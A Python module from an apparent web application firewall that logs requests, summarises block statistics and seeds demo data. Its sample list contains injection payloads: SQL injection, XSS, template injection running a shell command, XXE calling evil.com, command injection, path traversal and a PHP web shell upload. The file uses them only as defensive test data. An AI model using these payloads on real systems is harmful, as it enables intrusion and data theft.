import time
import random
import json
import structlog
from collections import deque
from typing import List, Dict, Optional
from datetime import datetime, timedelta
from models.request import RequestMetadata, Decision, ThreatLevel, AIAnalysisResult
from database import waf_db

logger = structlog.get_logger()

MAX_LOG_SIZE = 1000


SAMPLE_ATTACKS = [
    {"method": "GET", "path": "/search", "query": "q=1' OR '1'='1", "ip": "192.168.1.100", "threat": "SQL Injection: sql_injection_or_and", "level": "high"},
    {"method": "POST", "path": "/login", "body": "username=admin'--&password=x", "ip": "192.168.1.100", "threat": "SQL Injection: sql_comment_injection", "level": "high"},
    {"method": "GET", "path": "/users", "query": "id=1 UNION SELECT username,password FROM users--", "ip": "10.0.0.55", "threat": "SQL Injection: sql_injection_union", "level": "critical"},
    {"method": "GET", "path": "/api/data", "query": "id=1; DROP TABLE users--", "ip": "172.16.0.12", "threat": "SQL Injection: sql_injection_dml", "level": "critical"},
    {"method": "POST", "path": "/comment", "body": "<script>alert('XSS')</script>", "ip": "192.168.1.200", "threat": "XSS: xss_script_tag", "level": "medium"},
    {"method": "GET", "path": "/profile", "query": "name=<img src=x onerror=alert(1)>", "ip": "192.168.1.200", "threat": "XSS: xss_img_onerror", "level": "medium"},
    {"method": "POST", "path": "/search", "body": "{{7*7}}", "ip": "10.0.0.88", "threat": "SSTI: ssti_jinja2", "level": "high"},
    {"method": "GET", "path": "/render", "query": "template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "ip": "10.0.0.88", "threat": "SSTI: ssti_python_internals", "level": "critical"},
    {"method": "GET", "path": "/page", "query": "file=<!--#exec cmd=\"cat /etc/passwd\"-->", "ip": "172.16.0.33", "threat": "SSI: ssi_exec", "level": "critical"},
    {"method": "POST", "path": "/api/xml", "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "ip": "10.0.0.99", "threat": "XXE/XML: xxe_file_access", "level": "critical"},
    {"method": "POST", "path": "/api/data", "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]>", "ip": "10.0.0.99", "threat": "XXE/XML: xxe_http_access", "level": "critical"},
    {"method": "GET", "path": "/ping", "query": "host=;cat /etc/passwd", "ip": "192.168.1.50", "threat": "Command Injection: command_injection_direct", "level": "critical"},
    {"method": "POST", "path": "/api/exec", "body": "cmd=ls|whoami", "ip": "192.168.1.50", "threat": "Command Injection: command_injection_pipe", "level": "critical"},
    {"method": "GET", "path": "/download", "query": "file=../../../etc/passwd", "ip": "172.16.0.44", "threat": "File Inclusion: file_inclusion_linux", "level": "high"},
    {"method": "GET", "path": "/include", "query": "page=php://filter/convert.base64-encode/resource=config.php", "ip": "172.16.0.44", "threat": "File Inclusion: file_inclusion_php_wrappers", "level": "high"},
    {"method": "POST", "path": "/upload", "body": "Content-Disposition: form-data; filename=\"shell.php\"\n<?php system($_GET['cmd']); ?>", "ip": "192.168.1.150", "threat": "File Upload: file_upload_executable_extension", "level": "high"},
    {"method": "GET", "path": "/", "query": "", "ip": "8.8.8.8", "threat": "", "level": "none"},
    {"method": "GET", "path": "/api/users", "query": "page=1&limit=20", "ip": "8.8.4.4", "threat": "", "level": "none"},
    {"method": "POST", "path": "/api/login", "body": "username=john&password=secret123", "ip": "1.1.1.1", "threat": "", "level": "none"},
    {"method": "GET", "path": "/dashboard", "query": "", "ip": "1.2.3.4", "threat": "", "level": "none"},
    {"method": "GET", "path": "/static/css/main.css", "query": "", "ip": "5.6.7.8", "threat": "", "level": "none"},
    {"method": "GET", "path": "/api/products", "query": "category=electronics&sort=price", "ip": "9.8.7.6", "threat": "", "level": "none"},
]


class RequestLogger:
    def __init__(self):
        self._logs: deque = deque(maxlen=MAX_LOG_SIZE)
        self._subscribers: list = []
        self._data_loaded = False

    def log(self, metadata: RequestMetadata, analysis: AIAnalysisResult, analysis_time_ms: float):
        strategies_data = [
            {
                "name": s.strategy_name,
                "decision": s.decision.value,
                "threat_level": s.threat_level.value,
                "patterns": s.matched_patterns
            }
            for s in analysis.strategy_results
        ]
        strategies_json = json.dumps(strategies_data)

        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "method": metadata.method,
            "path": metadata.path,
            "source_ip": metadata.source_ip,
            "decision": analysis.overall_decision.value,
            "threat_level": analysis.overall_threat_level.value,
            "confidence": analysis.confidence,
            "reason": analysis.reasoning,
            "analysis_time_ms": round(analysis_time_ms, 2),
            "strategies": strategies_data
        }
        self._logs.append(entry)
        self._notify_subscribers(entry)

        user_agent = metadata.headers.get("user-agent", "") if metadata.headers else ""
        waf_db.log_request(
            method=metadata.method,
            path=metadata.path,
            query_string=metadata.query_string,
            source_ip=metadata.source_ip,
            user_agent=user_agent,
            decision=analysis.overall_decision.value,
            threat_level=analysis.overall_threat_level.value,
            confidence=analysis.confidence,
            reason=analysis.reasoning,
            analysis_time_ms=analysis_time_ms,
            strategies_json=strategies_json
        )

    def get_logs(self, limit: int = 50, offset: int = 0) -> List[Dict]:
        logs_list = list(self._logs)
        start = max(0, len(logs_list) - offset - limit)
        end = len(logs_list) - offset
        return logs_list[start:end]

    def get_summary(self) -> Dict:
        logs_list = list(self._logs)
        if not logs_list:
            return {
                "total_requests": 0,
                "blocked": 0,
                "allowed": 0,
                "block_rate": 0.0,
                "threat_levels": {},
                "top_blocked_paths": [],
                "top_blocked_ips": [],
                "avg_analysis_time_ms": 0.0
            }

        blocked = sum(1 for l in logs_list if l["decision"] == "block")
        allowed = sum(1 for l in logs_list if l["decision"] == "allow")

        threat_levels = {}
        for l in logs_list:
            tl = l["threat_level"]
            threat_levels[tl] = threat_levels.get(tl, 0) + 1

        blocked_paths = {}
        blocked_ips = {}
        for l in logs_list:
            if l["decision"] == "block":
                blocked_paths[l["path"]] = blocked_paths.get(l["path"], 0) + 1
                blocked_ips[l["source_ip"]] = blocked_ips.get(l["source_ip"], 0) + 1

        top_paths = sorted(blocked_paths.items(), key=lambda x: x[1], reverse=True)[:10]
        top_ips = sorted(blocked_ips.items(), key=lambda x: x[1], reverse=True)[:10]

        avg_time = sum(l["analysis_time_ms"] for l in logs_list) / len(logs_list)

        return {
            "total_requests": len(logs_list),
            "blocked": blocked,
            "allowed": allowed,
            "block_rate": round(blocked / len(logs_list) * 100, 2),
            "threat_levels": threat_levels,
            "top_blocked_paths": [{"path": p, "count": c} for p, c in top_paths],
            "top_blocked_ips": [{"ip": ip, "count": c} for ip, c in top_ips],
            "avg_analysis_time_ms": round(avg_time, 2)
        }

    def get_timeline(self, minutes: int = 60) -> List[Dict]:
        logs_list = list(self._logs)
        cutoff = time.time() - (minutes * 60)

        buckets = {}
        for l in logs_list:
            ts = datetime.fromisoformat(l["timestamp"]).timestamp()
            if ts < cutoff:
                continue
            bucket = int((ts - cutoff) / 60)
            if bucket not in buckets:
                buckets[bucket] = {"total": 0, "blocked": 0, "allowed": 0}
            buckets[bucket]["total"] += 1
            if l["decision"] == "block":
                buckets[bucket]["blocked"] += 1
            else:
                buckets[bucket]["allowed"] += 1

        timeline = []
        for i in range(minutes):
            bucket = buckets.get(i, {"total": 0, "blocked": 0, "allowed": 0})
            timeline.append({
                "minute": minutes - i,
                **bucket
            })

        return timeline

    def get_strategy_stats(self) -> List[Dict]:
        logs_list = list(self._logs)
        strategy_stats = {}

        for l in logs_list:
            for s in l.get("strategies", []):
                name = s["name"]
                if name not in strategy_stats:
                    strategy_stats[name] = {
                        "name": name,
                        "total": 0,
                        "blocked": 0,
                        "allowed": 0,
                        "patterns_detected": {}
                    }
                strategy_stats[name]["total"] += 1
                if s["decision"] == "block":
                    strategy_stats[name]["blocked"] += 1
                else:
                    strategy_stats[name]["allowed"] += 1

                for p in s.get("patterns", []):
                    strategy_stats[name]["patterns_detected"][p] = \
                        strategy_stats[name]["patterns_detected"].get(p, 0) + 1

        return list(strategy_stats.values())

    def subscribe(self, callback):
        self._subscribers.append(callback)
        return callback

    def unsubscribe(self, callback):
        if callback in self._subscribers:
            self._subscribers.remove(callback)

    def _notify_subscribers(self, entry):
        for callback in self._subscribers:
            try:
                callback(entry)
            except Exception as e:
                logger.error("subscriber_notify_failed", error=str(e))

    def seed_sample_data(self):
        if self._data_loaded:
            return {"status": "data_already_loaded"}

        now = datetime.utcnow()
        for i, attack in enumerate(SAMPLE_ATTACKS):
            ts = now - timedelta(minutes=random.randint(0, 59))
            decision = "block" if attack["threat"] else "allow"
            threat_level = attack["level"]
            confidence = random.uniform(0.7, 0.98) if attack["threat"] else random.uniform(0.85, 0.95)

            strategies = [
                {"name": "signature", "decision": decision, "threat_level": threat_level, "patterns": [attack["threat"]] if attack["threat"] else []},
                {"name": "behavior", "decision": decision if random.random() > 0.7 else "allow", "threat_level": threat_level if random.random() > 0.7 else "none", "patterns": []}
            ]
            strategies_json = json.dumps(strategies)

            entry = {
                "timestamp": ts.isoformat(),
                "method": attack["method"],
                "path": attack["path"],
                "source_ip": attack["ip"],
                "decision": decision,
                "threat_level": threat_level,
                "confidence": round(confidence, 2),
                "reason": f"Detected: {attack['threat']}" if attack["threat"] else "No malicious patterns detected",
                "analysis_time_ms": round(random.uniform(5, 150), 2),
                "strategies": strategies
            }
            self._logs.append(entry)

            waf_db.log_request(
                method=attack["method"], path=attack["path"], query_string="",
                source_ip=attack["ip"], user_agent="", decision=decision,
                threat_level=threat_level, confidence=round(confidence, 2),
                reason=entry["reason"], analysis_time_ms=round(random.uniform(5, 150), 2),
                strategies_json=strategies_json
            )

        self._data_loaded = True
        return {"status": "sample_data_loaded", "entries": len(SAMPLE_ATTACKS)}


request_logger = RequestLogger()
